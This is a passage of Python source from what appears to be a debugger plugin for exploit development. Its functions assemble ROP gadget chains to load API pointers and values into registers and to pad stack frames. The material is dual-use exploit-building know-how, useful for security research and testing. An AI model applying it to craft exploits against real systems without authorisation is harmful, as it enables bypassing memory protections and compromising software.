				smallparts = parts2[1].split("[")
				smallparts2 = smallparts[1].split("]")
				pickupfrom = smallparts2[0].lower()
				pickupfound = True
				if (pickupfrom.find("+") > -1):
					pickupfields = pickupfrom.split("+")
					if pickupfields[1].lower in allregs:
						pickupfound = False
						shortest_pickup = 0
				if (pickupfrom.find("-") > -1):
					pickupfields = pickupfrom.split("-")
					if pickupfields[1].lower in allregs:
						pickupfound = False
						shortest_pickup = 0				

	if shortest_pickup == 0:
		# no direct pickup, look for indirect pickup, but prefer EAX first
		for movetypes in suggestions:
			if movetypes.find("move eax") == 0 and movetypes.endswith("-> " + targetreg):
				typeparts = movetypes.split(" ")
				movefrom = "eax"
				shortest_move = getShortestGadget(suggestions[movetypes])
				movechain = getGadgetMoveRegToReg(movefrom,targetreg,suggestions,interestinggadgets)
				for pickuptypes in suggestions:
					if pickuptypes.find("pickup pointer into " + movefrom) > -1:
						thisshortest_pickup = getShortestGadget(suggestions[pickuptypes])
						if shortest_pickup == 0 or (thisshortest_pickup != 0 and thisshortest_pickup < shortest_pickup):
							shortest_pickup = thisshortest_pickup
							smallparts = pickuptypes.split(" ")
							pickupreg = smallparts[len(smallparts)-1].lower()
							parts2 = interestinggadgets[shortest_pickup].split("#")
							 #parts2[0] is empty
							smallparts = parts2[1].split("[")
							smallparts2 = smallparts[1].split("]")
							pickupfrom = smallparts2[0].lower()
							pickupfound = True
							if (pickupfrom.find("+") > -1):
								pickupfields = pickupfrom.split("+")
								if pickupfields[1].lower in allregs:
									pickupfound = False
									shortest_pickup = 0
							if (pickupfrom.find("-") > -1):
								pickupfields = pickupfrom.split("-")
								if pickupfields[1].lower in allregs:
									pickupfound = False
									shortest_pickup = 0
				if pickupfound:
					break
				
	if shortest_pickup == 0:
		# no direct pickup, look for indirect pickup
		for movetypes in suggestions:
			if movetypes.find("move") == 0 and movetypes.endswith("-> " + targetreg):
				typeparts = movetypes.split(" ")
				movefrom = typeparts[1]
				if movefrom != "esp":
					shortest_move = getShortestGadget(suggestions[movetypes])
					movechain = getGadgetMoveRegToReg(movefrom,targetreg,suggestions,interestinggadgets)
					for pickuptypes in suggestions:
						if pickuptypes.find("pickup pointer into " + movefrom) > -1:
							thisshortest_pickup = getShortestGadget(suggestions[pickuptypes])
							if shortest_pickup == 0 or (thisshortest_pickup != 0 and thisshortest_pickup < shortest_pickup):
								shortest_pickup = thisshortest_pickup
								smallparts = pickuptypes.split(" ")
								pickupreg = smallparts[len(smallparts)-1].lower()
								parts2 = interestinggadgets[shortest_pickup].split("#")
								 #parts2[0] is empty
								smallparts = parts2[1].split("[")
								smallparts2 = smallparts[1].split("]")
								pickupfrom = smallparts2[0].lower()
								pickupfound = True
								if (pickupfrom.find("+") > -1):
									pickupfields = pickupfrom.split("+")
									if pickupfields[1].lower in allregs:
										pickupfound = False
										shortest_pickup = 0
								if (pickupfrom.find("-") > -1):
									pickupfields = pickupfrom.split("-")
									if pickupfields[1].lower in allregs:
										pickupfound = False
										shortest_pickup = 0
					if pickupfound:
						break
						
	if shortest_pickup == 0:
		movechain = []
		#double move
		for movetype1 in suggestions:
			if movetype1.find("move") == 0 and movetype1.endswith("-> " + targetreg):
				interimreg = movetype1.split(" ")[1]
				if interimreg != "esp":
					for movetype2 in suggestions:
						if movetype2.find("move") == 0 and movetype2.endswith("-> " + interimreg):
							topickupreg= movetype2.split(" ")[1]
							if topickupreg != "esp":
								move1 = getShortestGadget(suggestions[movetype1])
								move2 = getShortestGadget(suggestions[movetype2])								
								for pickuptypes in suggestions:
									if pickuptypes.find("pickup pointer into " + topickupreg) > -1:
										thisshortest_pickup = getShortestGadget(suggestions[pickuptypes])
										if shortest_pickup == 0 or (thisshortest_pickup != 0 and thisshortest_pickup < shortest_pickup):
											shortest_pickup = thisshortest_pickup
											smallparts = pickuptypes.split(" ")
											pickupreg = smallparts[len(smallparts)-1].lower()
											parts2 = interestinggadgets[shortest_pickup].split("#")
											 #parts2[0] is empty
											smallparts = parts2[1].split("[")
											smallparts2 = smallparts[1].split("]")
											pickupfrom = smallparts2[0].lower()
											pickupfound = True
											if (pickupfrom.find("+") > -1):
												pickupfields = pickupfrom.split("+")
												if pickupfields[1].lower in allregs:
													pickupfound = False
													shortest_pickup = 0
											if (pickupfrom.find("-") > -1):
												pickupfields = pickupfrom.split("-")
												if pickupfields[1].lower in allregs:
													pickupfound = False
													shortest_pickup = 0		
								if pickupfound:
									movechain = []
									movechain1 = getGadgetMoveRegToReg(interimreg,targetreg,suggestions,interestinggadgets)
									movechain2 = getGadgetMoveRegToReg(topickupreg,interimreg,suggestions,interestinggadgets)
									break
									
	if shortest_pickup > 0:
		# put a value in a register
		if targetval > 0:
			poproutine = putValueInReg(pickupfrom,targetval,freetext,suggestions,interestinggadgets,criteria)
			for popsteps in poproutine:
				pickupchain.append([popsteps[0],popsteps[1],popsteps[2]])
		else:
			pickupchain.append([0,"[-] Unable to find API pointer -> " + pickupfrom,0])
		# pickup
		junksize = getJunk(interestinggadgets[shortest_pickup])
		pickupchain.append([shortest_pickup,"",junksize])
		# move if needed
		if len(movechain) > 0:
			for movesteps in movechain:
				pickupchain.append([movesteps[0],movesteps[1],movesteps[2]])
		
		if len(movechain2) > 0:
			for movesteps in movechain2:
				pickupchain.append([movesteps[0],movesteps[1],movesteps[2]])
		
		if len(movechain1) > 0:
			for movesteps in movechain1:
				pickupchain.append([movesteps[0],movesteps[1],movesteps[2]])
	else:
		# use alternative technique
		if "pop " + targetreg in suggestions and "pop eax" in suggestions:
			# find a jmp [eax]
			pattern = "jmp [eax]"
			base = 0
			top = TOP_USERLAND
			type = "instr"
			al = criteria["accesslevel"]
			criteria["accesslevel"] = "X"
			global ptr_to_get
			global ptr_counter
			ptr_counter = 0				
			ptr_to_get = 5
			theptr = 0
			global silent
			oldsilent = silent
			silent=True				
			allpointers = findPattern(modulecriteria,criteria,pattern,type,base,top)
			silent = oldsilent
			criteria["accesslevel"] = al
			thismodname = ""
			if len(allpointers) > 0:
				for ptrtype in allpointers:
					for ptrs in allpointers[ptrtype]:
						theptr = ptrs
						thismodname = MnPointer(theptr).belongsTo()
						break
			if theptr > 0:
				popptrtar = getShortestGadget(suggestions["pop "+targetreg])
				popptreax = getShortestGadget(suggestions["pop eax"])
				junksize = getJunk(interestinggadgets[popptrtar])-4
				pickupchain.append([popptrtar,"",junksize])
				pickupchain.append([theptr,"JMP [EAX] [" + thismodname + "]",0])
				junksize = getJunk(interestinggadgets[popptreax])-4
				pickupchain.append([popptreax,"",junksize])
				pickupchain.append([targetval,freetext,0])
				disablelist.append("eax")
				pickupfound = True	

		if not pickupfound:
			pickupchain.append([0,"[-] Unable to find gadgets to pickup the desired API pointer into " + targetreg,0])
			pickupchain.append([targetval,freetext,0])
		
	return pickupchain,disablelist
	
def getRopFuncPtr(apiname,modulecriteria,criteria,mode = "iat"):
	"""
	Will get a pointer to pointer to the given API name in the IAT of the selected modules
	
	Arguments :
	apiname : the name of the functino
	modulecriteria & criteria : module/pointer criteria
	
	Returns :
	a pointer (integer value, 0 if no pointer was found)
	text (with optional info)
	"""
	global silent
	oldsilent = silent
	silent = True
	global ptr_to_get
	ptr_to_get = -1	
	rfuncsearch = apiname.lower()
	
	
	ropfuncptr = 0
	ropfunctext = "ptr to &" + apiname + "()"
	
	if mode == "iat":	
		ropfuncs,ropfuncoffsets = findROPFUNC(modulecriteria,criteria)
		silent = oldsilent
		#first look for good one
		for ropfunctypes in ropfuncs:
			if ropfunctypes.lower().find(rfuncsearch) > -1 and ropfunctypes.lower().find("rebased") == -1:
				ropfuncptr = ropfuncs[ropfunctypes][0]
				break
		if ropfuncptr == 0:
			for ropfunctypes in ropfuncs:
				if ropfunctypes.lower().find(rfuncsearch) > -1:
					ropfuncptr = ropfuncs[ropfunctypes][0]
					break
		#still haven't found ? clear out modulecriteria		
		if ropfuncptr == 0:
			oldsilent = silent
			silent = True
			limitedmodulecriteria = {}
			limitedmodulecriteria["os"] = True
			ropfuncs2,ropfuncoffsets2 = findROPFUNC(limitedmodulecriteria,criteria)
			silent = oldsilent
			for ropfunctypes in ropfuncs2:
				if ropfunctypes.lower().find(rfuncsearch) > -1 and ropfunctypes.lower().find("rebased") == -1:
					ropfuncptr = ropfuncs2[ropfunctypes][0]
					ropfunctext += " (skipped module criteria, check if pointer is reliable !)"
					break	
		
		if ropfuncptr == 0:
			ropfunctext = "[-] Unable to find ptr to &" + apiname+"()"
		else:
			ropfunctext += " [IAT " + MnPointer(ropfuncptr).belongsTo() + "]"
	else:
		# read EAT
		modulestosearch = getModulesToQuery(modulecriteria)
		for mod in modulestosearch:
			tmod = MnModule(mod)
			funcs = tmod.getEAT()
			for func in funcs:
				funcname = funcs[func].lower()
				if funcname.find(rfuncsearch) > -1:
					ropfuncptr = func
					break
		if ropfuncptr == 0:
			ropfunctext = "[-] Unable to find required API pointer"
	return ropfuncptr,ropfunctext

	
def putValueInReg(reg,value,freetext,suggestions,interestinggadgets,criteria):

	putchain = []
	allownull = True
	popptr = 0
	gadgetfound = False
	
	offset = 0
	if "+" in reg:
		try:
			rval = reg.split("+")[1].strip("h")
			offset = int(rval,16) * (-1)
			reg = reg.split("+")[0]
		except:
			reg = reg.split("+")[0]
			offset = 0
	elif "-" in reg:
		try:
			rval = reg.split("-")[1].strip("h")
			offset = int(rval,16)
			reg = reg.split("-")[0]
		except:
			reg = reg.split("-")[0]
			offset = 0
			
	if value != 0:	
		value = value + offset

	if value < 0:
		value = 0xffffffff + value + 1
		
	negvalue = 4294967296 - value
	
	ptrval = MnPointer(value)	
	
	if meetsCriteria(ptrval,criteria):
		# easy way - just pop it into a register
		for poptype in suggestions:
			if poptype.find("pop "+reg) == 0:
				popptr = getShortestGadget(suggestions[poptype])
				junksize = getJunk(interestinggadgets[popptr])-4
				putchain.append([popptr,"",junksize])
				putchain.append([value,freetext,0])
				gadgetfound = True
				break
		if not gadgetfound:
			# move
			for movetype in suggestions:
				if movetype.startswith("move") and movetype.endswith("-> " + reg):
					# get "from" reg
					fromreg = movetype.split(" ")[1].lower()
					for poptype in suggestions:
						if poptype.find("pop "+fromreg) == 0:
							popptr = getShortestGadget(suggestions[poptype])
							junksize = getJunk(interestinggadgets[popptr])-4
							putchain.append([popptr,"",junksize])
							putchain.append([value,freetext,0])
							moveptr = getShortestGadget(suggestions[movetype])
							movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
							for movesteps in movechain:
								putchain.append([movesteps[0],movesteps[1],movesteps[2]])
							gadgetfound = True
							break
					if gadgetfound:
						break
	if not gadgetfound or not meetsCriteria(ptrval,criteria):
		if meetsCriteria(MnPointer(negvalue),criteria):
			if "pop " + reg in suggestions and "neg "+reg in suggestions:
				popptr = getShortestGadget(suggestions["pop "+reg])
				junksize = getJunk(interestinggadgets[popptr])-4
				putchain.append([popptr,"",junksize])
				putchain.append([negvalue,"Value to negate, will become 0x" + toHex(value),0])
				negptr = getShortestGadget(suggestions["neg "+reg])
				junksize = getJunk(interestinggadgets[negptr])
				putchain.append([negptr,"",junksize])
				gadgetfound = True
			if not gadgetfound:
				for movetype in suggestions:
					if movetype.startswith("move") and movetype.endswith("-> " + reg):
						fromreg = movetype.split(" ")[1]
						if "pop " + fromreg in suggestions and "neg " + fromreg in suggestions:
							popptr = getShortestGadget(suggestions["pop "+fromreg])
							junksize = getJunk(interestinggadgets[popptr])-4
							putchain.append([popptr,"",junksize])
							putchain.append([negvalue,"Value to negate, will become 0x" + toHex(value)])
							negptr = getShortestGadget(suggestions["neg "+fromreg])
							junksize = getJunk(interestinggadgets[negptr])
							putchain.append([negptr,"",junksize])
							movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
							for movesteps in movechain:
								putchain.append([movesteps[0],movesteps[1],movesteps[2]])
							gadgetfound = True
							break
		if not gadgetfound:
			# can we do this using add/sub via another register ?
			for movetype in suggestions:
				if movetype.startswith("move") and movetype.endswith("-> " + reg):
					fromreg = movetype.split(" ")[1]
					if "pop "+ fromreg in suggestions and "add value to " + fromreg in suggestions:
						# check each value & see if delta meets pointer criteria
						#dbg.log("move %s into %s" % (fromreg,reg))
						for addinstr in suggestions["add value to " + fromreg]:
							if not gadgetfound:
								theinstr = interestinggadgets[addinstr][3:len(interestinggadgets[addinstr])]
								#dbg.log("%s" % theinstr)
								instrparts = theinstr.split("#")
								totalvalue = 0
								#gadget might contain multiple add/sub instructions
								for indivinstr in instrparts:
									instrvalueparts = indivinstr.split(',')
									if len(instrvalueparts) > 1:
										# only look at real values
										if isHexValue(instrvalueparts[1].rstrip()):
											thisval = hexStrToInt(instrvalueparts[1])
											if instrvalueparts[0].lstrip().startswith("ADD"):
												totalvalue += thisval
											if instrvalueparts[0].lstrip().startswith("SUB"):
												totalvalue -= thisval
								# subtract totalvalue from target value
								if totalvalue > 0:
									deltaval = value - totalvalue
									if deltaval < 0:
										deltaval = 0xffffffff + deltaval + 1
									deltavalhex = toHex(deltaval)
									if meetsCriteria(MnPointer(deltaval),criteria):
										#dbg.log("   Instruction : %s, Delta : %s, To pop in reg : %s" % (theinstr,toHex(totalvalue),deltavalhex),highlight=1)
										popptr = getShortestGadget(suggestions["pop "+fromreg])
										junksize = getJunk(interestinggadgets[popptr])-4
										putchain.append([popptr,"",junksize])
										putchain.append([deltaval,"put delta into " + fromreg + " (-> put 0x" + toHex(value) + " into " + reg + ")",0])
										junksize = getJunk(interestinggadgets[addinstr])
										putchain.append([addinstr,"",junksize])
										movptr = getShortestGadget(suggestions["move "+fromreg + " -> " + reg])
										junksize = getJunk(interestinggadgets[movptr])
										putchain.append([movptr,"",junksize])
										gadgetfound = True
									
		if not gadgetfound:
			if "pop " + reg in suggestions and "neg "+reg in suggestions and "dec "+reg in suggestions:
				toinc = 0
				while not meetsCriteria(MnPointer(negvalue-toinc),criteria):
					toinc += 1
					if toinc > 250:
						break
				if toinc <= 250:
					popptr = getShortestGadget(suggestions["pop "+reg])
					junksize = getJunk(interestinggadgets[popptr])-4
					putchain.append([popptr,"",junksize])
					putchain.append([negvalue-toinc,"Value to negate, destination value : 0x" + toHex(value),0])
					negptr = getShortestGadget(suggestions["neg "+reg])
					cnt = 0
					decptr = getShortestGadget(suggestions["dec "+reg])
					junksize = getJunk(interestinggadgets[negptr])
					putchain.append([negptr,"",junksize])
					junksize = getJunk(interestinggadgets[decptr])
					while cnt < toinc:
						putchain.append([decptr,"",junksize])
						cnt += 1
					gadgetfound = True
				
			if not gadgetfound:
				for movetype in suggestions:
					if movetype.startswith("move") and movetype.endswith("-> " + reg):
						fromreg = movetype.split(" ")[1]
						if "pop " + fromreg in suggestions and "neg " + fromreg in suggestions and "dec "+fromreg in suggestions:
							toinc = 0							
							while not meetsCriteria(MnPointer(negvalue-toinc),criteria):
								toinc += 1
								if toinc > 250:
									break
							if toinc <= 250:
								popptr = getShortestGadget(suggestions["pop "+fromreg])
								junksize = getJunk(interestinggadgets[popptr])-4
								putchain.append([popptr,"",junksize])
								putchain.append([negvalue-toinc,"Value to negate, destination value : 0x" + toHex(value),0])
								negptr = getShortestGadget(suggestions["neg "+fromreg])
								junksize = getJunk(interestinggadgets[negptr])
								cnt = 0
								decptr = getShortestGadget(suggestions["dec "+fromreg])
								putchain.append([negptr,"",junksize])
								junksize = getJunk(interestinggadgets[decptr])
								while cnt < toinc:
									putchain.append([decptr,"",junksize])
									cnt += 1
								movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
								for movesteps in movechain:
									putchain.append([movesteps[0],movesteps[1],movesteps[2]])
								gadgetfound = True
								break
							
			if not gadgetfound and "pop " + reg in suggestions and "neg "+reg in suggestions and "inc "+reg in suggestions:
				toinc = 0
				while not meetsCriteria(MnPointer(negvalue-toinc),criteria):
					toinc -= 1
					if toinc < -250:
						break
				if toinc > -250:
					popptr = getShortestGadget(suggestions["pop "+reg])
					junksize = getJunk(interestinggadgets[popptr])-4
					putchain.append([popptr,"",junksize])
					putchain.append([negvalue-toinc,"Value to negate, destination value : 0x" + toHex(value),0])
					negptr = getShortestGadget(suggestions["neg "+reg])
					junksize = getJunk(interestinggadgets[negptr])
					putchain.append([negptr,"",junksize])				
					incptr = getShortestGadget(suggestions["inc "+reg])
					junksize = getJunk(interestinggadgets[incptr])
					while toinc < 0:
						putchain.append([incptr,"",junksize])
						toinc += 1
					gadgetfound = True
				
			if not gadgetfound:
				for movetype in suggestions:
					if movetype.startswith("move") and movetype.endswith("-> " + reg):
						fromreg = movetype.split(" ")[1]
						if "pop " + fromreg in suggestions and "neg " + fromreg in suggestions and "inc "+fromreg in suggestions:
							toinc = 0							
							while not meetsCriteria(MnPointer(negvalue-toinc),criteria):
								toinc -= 1	
								if toinc < -250:
									break
							if toinc > -250:
								popptr = getShortestGadget(suggestions["pop "+fromreg])
								junksize = getJunk(interestinggadgets[popptr])-4
								putchain.append([popptr,""])
								putchain.append([negvalue-toinc,"Value to negate, destination value : 0x" + toHex(value)])
								negptr = getShortestGadget(suggestions["neg "+fromreg])
								junksize = getJunk(interestinggadgets[negptr])
								putchain.append([negptr,"",junksize])							
								decptr = getShortestGadget(suggestions["inc "+fromreg])
								junksize = getJunk(interestinggadgets[incptr])
								while toinc < 0 :
									putchain.append([incptr,"",junksize])
									toinc += 1
								movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
								for movesteps in movechain:
									putchain.append([movesteps[0],movesteps[1],movesteps[2]])
								gadgetfound = True
								break
							
		if not gadgetfound and "add value to " + reg in suggestions and "pop " + reg in suggestions:
			addtypes = ["ADD","ADC","XOR", "SUB"]
			for addtype in addtypes:
				for ptrs in suggestions["add value to " + reg]:
					thisinstr = interestinggadgets[ptrs]
					thisparts = thisinstr.split("#")
					addinstr = thisparts[1].lstrip().split(",")
					if thisparts[1].startswith(addtype):
						if addtype == "ADD" or addtype == "ADC":
							addvalue = hexStrToInt(addinstr[1])
							delta = value - addvalue
							if delta < 0:
								delta = 0xffffffff + delta + 1
						if addtype == "XOR":
							delta = hexStrToInt(addinstr[1]) ^ value
						if addtype == "SUB":
							addvalue = hexStrToInt(addinstr[1])
							delta = value + addvalue
							if delta < 0:
								delta = 0xffffffff + delta + 1							
						if meetsCriteria(MnPointer(delta),criteria):
							popptr = getShortestGadget(suggestions["pop "+reg])
							junksize = getJunk(interestinggadgets[popptr])-4
							putchain.append([popptr,"",junksize])
							putchain.append([delta,"Diff to desired value",0])
							junksize = getJunk(interestinggadgets[ptrs])
							putchain.append([ptrs,"",junksize])
							gadgetfound = True
							break
							
		if not gadgetfound:
			for movetype in suggestions:
				if movetype.startswith("move") and movetype.endswith("-> " + reg):
					fromreg = movetype.split(" ")[1]		
					if "add value to " + fromreg in suggestions and "pop " + fromreg in suggestions:
						addtypes = ["ADD","ADC","XOR","SUB"]
						for addtype in addtypes:
							for ptrs in suggestions["add value to " + fromreg]:
								thisinstr = interestinggadgets[ptrs]
								thisparts = thisinstr.split("#")
								addinstr = thisparts[1].lstrip().split(",")
								if thisparts[1].startswith(addtype):
									if addtype == "ADD" or addtype == "ADC":
										addvalue = hexStrToInt(addinstr[1])
										delta = value - addvalue
										if delta < 0:
											delta = 0xffffffff + delta + 1
									if addtype == "XOR":
										delta = hexStrToInt(addinstr[1]) ^ value
									if addtype == "SUB":
										addvalue = hexStrToInt(addinstr[1])
										delta = value + addvalue
										if delta < 0:
											delta = 0xffffffff + delta + 1												
									#dbg.log("0x%s : %s, delta : 0x%s" % (toHex(ptrs),thisinstr,toHex(delta)))
									if meetsCriteria(MnPointer(delta),criteria):
										popptr = getShortestGadget(suggestions["pop "+fromreg])
										junksize = getJunk(interestinggadgets[popptr])-4
										putchain.append([popptr,"",junksize])
										putchain.append([delta,"Diff to desired value",0])
										junksize = getJunk(interestinggadgets[ptrs])
										putchain.append([ptrs,"",junksize])
										movechain = getGadgetMoveRegToReg(fromreg,reg,suggestions,interestinggadgets)
										for movesteps in movechain:
											putchain.append([movesteps[0],movesteps[1],movesteps[2]])
										gadgetfound = True
										break
		if not gadgetfound and "inc " + reg in suggestions and value <= 64:
			cnt = 0
			# can we clear the reg ?
			clearsteps = clearReg(reg,suggestions,interestinggadgets)
			for cstep in clearsteps:
				putchain.append([cstep[0],cstep[1],cstep[2]])			
			# inc
			incptr = getShortestGadget(suggestions["inc "+reg])
			junksize = getJunk(interestinggadgets[incptr])
			while cnt < value:
				putchain.append([incptr,"",junksize])
				cnt += 1
			gadgetfound = True
		if not gadgetfound:
			putchain.append([0,"[-] Unable to find gadget to put " + toHex(value) + " into " + reg,0])
	return putchain

def getGadgetMoveRegToReg(fromreg,toreg,suggestions,interestinggadgets):
	movechain = []
	movetype = "move " + fromreg + " -> " + toreg
	if movetype in suggestions:
		moveptr = getShortestGadget(suggestions[movetype])
		moveinstr = interestinggadgets[moveptr].lstrip()
		if moveinstr.startswith("# XOR") or moveinstr.startswith("# OR") or moveinstr.startswith("# AD"):
			clearchain = clearReg(toreg,suggestions,interestinggadgets)
			for cc in clearchain:
				movechain.append([cc[0],cc[1],cc[2]])
		junksize = getJunk(interestinggadgets[moveptr])		
		movechain.append([moveptr,"",junksize])
	else:
		movetype1 = "xor " + fromreg + " -> " + toreg
		movetype2 = "xor " + toreg + " -> " + fromreg
		if movetype1 in suggestions and movetype2 in suggestions:
			moveptr1 = getShortestGadget(suggestions[movetype1])
			junksize = getJunk(interestinggadgets[moveptr1])
			movechain.append([moveptr1,"",junksize])
			moveptr2 = getShortestGadget(suggestions[movetype2])
			junksize = getJunk(interestinggadgets[moveptr2])
			movechain.append([moveptr2,"",junksize])
	return movechain

def clearReg(reg,suggestions,interestinggadgets):
	clearchain = []
	clearfound = False
	if not "clear " + reg in suggestions:
		if not "inc " + reg in suggestions or not "pop " + reg in suggestions:
			# maybe it will work using a move from another register
			for inctype in suggestions:
				if inctype.startswith("inc"):
					increg = inctype.split(" ")[1]
					iptr = getShortestGadget(suggestions["inc " + increg])
					for movetype in suggestions:
						if movetype == "move " + increg + " -> " + reg and "pop " + increg in suggestions:
							moveptr = getShortestGadget(suggestions[movetype])
							moveinstr = interestinggadgets[moveptr].lstrip()
							if not(moveinstr.startswith("# XOR") or moveinstr.startswith("# OR") or moveinstr.startswith("# AD")):
								#kewl
								pptr = getShortestGadget(suggestions["pop " + increg])
								junksize = getJunk(interestinggadgets[pptr])-4
								clearchain.append([pptr,"",junksize])
								clearchain.append([0xffffffff," ",0])
								junksize = getJunk(interestinggadgets[iptr])
								clearchain.append([iptr,"",junksize])
								junksize = getJunk(interestinggadgets[moveptr])
								clearchain.append([moveptr,"",junksize])
								clearfound = True
								break
			if not clearfound:				
				clearchain.append([0,"[-] Unable to find a gadget to clear " + reg,0])
		else:
			#pop FFFFFFFF into reg, then do inc reg => 0
			pptr = getShortestGadget(suggestions["pop " + reg])
			junksize = getJunk(interestinggadgets[pptr])-4
			clearchain.append([pptr,"",junksize])
			clearchain.append([0xffffffff," ",0])
			iptr = getShortestGadget(suggestions["inc " + reg])
			junksize = getJunk(interestinggadgets[iptr])
			clearchain.append([iptr,"",junksize])
	else:
		shortest_clear = getShortestGadget("clear " + reg)
		junksize = getJunk(interestinggadgets[shortest_clear])
		clearchain.append([shortest_clear,"",junksize])
	return clearchain
	
def getGadgetValueToReg(reg,value,suggestions,interestinggadgets):
	negfound = False
	blocktxt = ""
	blocktxt2 = ""	
	tonegate = 4294967296 - value
	nregs = ["eax","ebx","ecx","edx","edi"]
	junksize = 0
	junk2size = 0
	negateline = "\t\t\t0x" + toHex(tonegate)+",\t# value to negate, target value : 0x" + toHex(value) + ", target reg : " + reg +"\n"
	if "neg " + reg in suggestions:
		negfound = True
		negptr = getShortestGadget(suggestions["neg " + reg])
		if "pop "+reg in suggestions:
			pptr = getShortestGadget(suggestions["pop " + reg])
			blocktxt2 += "\t\t\t0x" + toHex(pptr)+",\t"+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"					
			blocktxt2 += negateline
			junk2size = getJunk(interestinggadgets[pptr])-4
		else:
			blocktxt2 += "\t\t\t0x????????,#\tfind a way to pop the next value into "+thisreg+"\n"					
			blocktxt2 += negateline			
		blocktxt2 += "\t\t\t0x" + toHex(negptr)+",\t"+interestinggadgets[negptr].strip()+" ("+MnPointer(negptr).belongsTo()+")\n"
		junksize = getJunk(interestinggadgets[negptr])-4
		
	if not negfound:
		nregs.remove(reg)
		for thisreg in nregs:
			if "neg "+ thisreg in suggestions and not negfound:
				blocktxt2 = ""
				junk2size = 0
				negfound = True
				#get pop first
				if "pop "+thisreg in suggestions:
					pptr = getShortestGadget(suggestions["pop " + thisreg])
					blocktxt2 += "\t\t\t0x" + toHex(pptr)+",\t"+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"					
					blocktxt2 += negateline
					junk2size = getJunk(interestinggadgets[pptr])-4
				else:
					blocktxt2 += "\t\t\t0x????????,#\tfind a way to pop the next value into "+thisreg+"\n"					
					blocktxt2 += negateline				
				negptr = getShortestGadget(suggestions["neg " + thisreg])
				blocktxt2 += "\t\t\t0x" + toHex(negptr)+",\t"+interestinggadgets[negptr].strip()+" ("+MnPointer(negptr).belongsTo()+")\n"
				junk2size = junk2size + getJunk(interestinggadgets[negptr])-4				
				#now move it to reg
				if "move " + thisreg + " -> " + reg in suggestions:
					bptr = getShortestGadget(suggestions["move " + thisreg + " -> " + reg])
					if interestinggadgets[bptr].strip().startswith("# ADD"):
						if not "clear " + reg in suggestions:
							# other way to clear reg, using pop + inc ?
							if not "inc " + reg in suggestions or not "pop " + reg in suggestions:
								blocktxt2 += "\t\t\t0x????????,\t# find pointer to clear " + reg+"\n"
							else:
								#pop FFFFFFFF into reg, then do inc reg => 0
								pptr = getShortestGadget(suggestions["pop " + reg])
								blocktxt2 += "\t\t\t0x" + toHex(pptr)+",\t"+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"
								blocktxt2 += "\t\t\t0xffffffff,\t# pop value into " + reg + "\n"
								blocktxt2 += createJunk(getJunk(interestinggadgets[pptr])-4)
								iptr = getShortestGadget(suggestions["inc " + reg])
								blocktxt2 += "\t\t\t0x" + toHex(iptr)+",\t"+interestinggadgets[iptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"								
								junksize += getJunk(interestinggadgets[iptr])
						else:
							clearptr = getShortestGadget(suggestions["empty " + reg])
							blocktxt2 += "\t\t\t0x" + toHex(clearptr)+",\t"+interestinggadgets[clearptr].strip()+" ("+MnPointer(clearptr).belongsTo()+")\n"	
							junk2size = junk2size + getJunk(interestinggadgets[clearptr])-4
					blocktxt2 += "\t\t\t0x" + toHex(bptr)+",\t"+interestinggadgets[bptr].strip()+" ("+MnPointer(bptr).belongsTo()+")\n"
					junk2size = junk2size + getJunk(interestinggadgets[bptr])-4
				else:
					negfound = False
	if negfound: 
		blocktxt += blocktxt2
	else:
		blocktxt = ""
	junksize = junksize + junk2size
	return blocktxt,junksize

def getOffset(instructions):
	offset = 0
	instrparts = instructions.split("#")
	retpart = instrparts[len(instrparts)-1].strip()
	retparts = retpart.split(" ")
	if len(retparts) > 1:
		offset = hexStrToInt(retparts[1])
	return offset
	
def getJunk(instructions):
	junkpop = instructions.count("POP ") * 4
	junkpush = instructions.count("PUSH ") * -4
	junkpushad = instructions.count("PUSHAD ") * -32
	junkpopad = instructions.count("POPAD") * 32
	junkinc = instructions.count("INC ESP") * 1
	junkdec = instructions.count("DEC ESP") * -1
	junkesp = 0
	if instructions.find("ADD ESP,") > -1:
		instparts = instructions.split("#")
		for part in instparts:
			thisinstr = part.strip()
			if thisinstr.startswith("ADD ESP,"):
				value = thisinstr.split(",")
				junkesp += hexStrToInt(value[1])
	if instructions.find("SUB ESP,") > -1:
		instparts = instructions.split("#")
		for part in instparts:
			thisinstr = part.strip()
			if thisinstr.startswith("SUB ESP,"):
				value = thisinstr.split(",")
				junkesp -= hexStrToInt(value[1])
	junk = junkpop + junkpush + junkpopad + junkpushad + junkesp
	return junk

def createJunk(size,message="filler (compensate)",alignsize=0):
	bytecnt = 0
	dword = 0
	junktxt = ""
	while bytecnt < size:
		dword = 0
		junktxt += "\t\t\t0x"
		while dword < 4 and bytecnt < size :
			junktxt += "41"
			dword += 1
			bytecnt += 1
		junktxt += ","
		junktxt += toSize("",alignsize + 4 - dword)
		junktxt += "\t# "+message+"\n"
	return junktxt

	
def getShortestGadget(chaintypedict):
	shortest = 100
	shortestptr = 0
	shortestinstr = "A" * 1000
	thischaindict = chaintypedict.copy()
	#shuffle dict so returning ptrs would be different each time
	while thischaindict:
		typeptr, thisinstr = random.choice(thischaindict.items())
		if thisinstr.startswith("# XOR") or thisinstr.startswith("# OR") or thisinstr.startswith("# AD"):
			thisinstr += "     "	# make sure we don prefer MOV or XCHG
		thiscount = thisinstr.count("#")
		thischaindict.pop(typeptr)
		if thiscount < shortest:
			shortest = thiscount
			shortestptr = typeptr
			shortestinstr = thisinstr
		else:
			if thiscount == shortest:
				if len(thisinstr) < len(shortestinstr):
					shortest = thiscount
					shortestptr = typeptr
					shortestinstr = thisinstr
	return shortestptr

def isInterestingGadget(instructions):
	if isAsciiString(instructions):
		interesting =	[
						"POP E", "XCHG E", "LEA E", "PUSH E", "XOR E", "AND E", "NEG E", 
						"OR E", "ADD E", "SUB E", "INC E", "DEC E", "POPAD", "PUSHAD",
						"SUB A", "ADD A", "NOP", "ADC E",
						"SUB BH", "SUB BL", "ADD BH", "ADD BL", 
						"SUB CH", "SUB CL", "ADD CH", "ADD CL",
						"SUB DH", "SUB DL", "ADD DH", "ADD DL",
						"MOV E", "CLC", "CLD", "FS:", "FPA", "TEST "
						]
		notinteresting = [ "MOV ESP,EBP", "LEA ESP"	]
